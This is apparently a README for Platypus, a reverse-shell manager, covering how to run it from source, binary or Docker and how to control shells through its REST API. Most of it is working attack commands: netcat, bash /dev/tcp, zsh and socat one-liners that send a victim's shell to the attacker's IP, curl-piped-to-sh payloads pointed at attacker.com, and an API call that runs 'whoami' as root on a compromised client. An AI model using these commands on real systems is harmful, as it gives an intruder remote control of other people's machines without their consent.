#### Network Topology
```
Attack IP: 192.168.1.2
    Reverse Shell Service: 0.0.0.0:8080
    RESTful Service: 127.0.0.1:9090
Victim IP: 192.168.1.3
```

#### Run Platypus in multiple ways
* Run Platypus from source code
```
go get github.com/WangYihang/Platypus
cd go/src/github.com/WangYihang/Platypus
go run platypus.go
```

* Run Platypus from release binaries
```
// Download binary from https://github.com/WangYihang/Platypus/releases
chmod +x ./Platypus_linux_amd64
./Platypus_linux_amd64
```

* Run Platypus from docker
```
// Build your docker image
docker build -t xxxx/Platypus .

// Use host network mode to run container
docker run --net=host -it xxxx/Platypus

// Don' t use host network, and you need to specify the port manually
docker run -p 8000:8000 -p 9000:9000 xxxx/Platypus
```

#### Victim side
```
nc -e /bin/bash 192.168.1.2 8080
bash -c 'bash -i >/dev/tcp/192.168.1.2/8080 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.1.2 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
```

#### Reverse shell as a Service
```bash
// Platypus is able to multiplexing the reverse shell listening port
// The port 8080 can receive reverse shell client connection
// Also these is a Reverse shell as a service running on this port

// victim will be redirected to attacker-host attacker-port
// sh -c "$(curl http://host:port/attacker-host/attacker-port)"
# curl http://192.168.1.2:8080/attacker.com/1337
bash -c 'bash -i >/dev/tcp/attacker.com/1337 0>&1'
# sh -c "$(curl http://192.168.1.2:8080/attacker.com/1337)"

// if the attacker info not specified, it will use host, port as attacker-host attacker-port
// sh -c "$(curl http://host:port/)"
# curl http://192.168.1.2:8080/
curl http://192.168.1.2:8080/192.168.1.2/8080|sh
# sh -c "$(curl http://host:port/)"
```

#### RESTful API
* `GET /client` List all online clients
```
# curl 'http://127.0.0.1:9090/client'
{
    "msg": [
        "192.168.1.3:54798"
    ],
    "status": true
}
```
* `POST /client/:hash` execute a command on a specific client
```
# curl -X POST 'http://127.0.0.1:9090/client/0723c3bed0d0240140e10a6ffd36eed4' --data 'cmd=whoami'
{
    "status": true,
    "msg": "root\n",
}
```
* How to hash?
```
# echo -n "192.168.1.3:54798" | md5sum
0723c3bed0d0240140e10a6ffd36eed4  -
```

